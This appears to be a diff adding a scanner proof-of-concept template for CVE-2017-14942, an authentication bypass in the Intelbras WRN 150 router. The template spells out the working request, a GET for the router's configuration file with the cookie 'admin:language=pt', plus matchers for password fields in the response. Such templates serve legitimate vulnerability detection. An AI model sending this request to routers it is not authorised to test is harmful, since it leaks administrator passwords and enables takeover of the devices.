@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "Intelbras WRN 150 路由器存在认证绕过漏洞，远程攻击者无需认证即可通过向 /cgi-bin/DownloadCfg/RouterCfm.cfg 发送 HTTP 请求并携带 admin:language=pt Cookie，绕过身份验证并下载设备配置文件，泄露管理员密码等敏感信息。"
+id = "POC-AVE-2017-0048"
+name = "Intelbras WRN 150 认证绕过 PoC"
+severity = "critical"
+tags = ["ave-2017-0048"]
+vuln_id = [
+    "CVE-2017-14942",
+    "AVE-2017-0048",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/DownloadCfg/RouterCfm.cfg"
+protocol = "http"
+
+[poc.requests.headers]
+Cookie = "admin:language=pt"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "wl_",
+    "_passwd",
+]
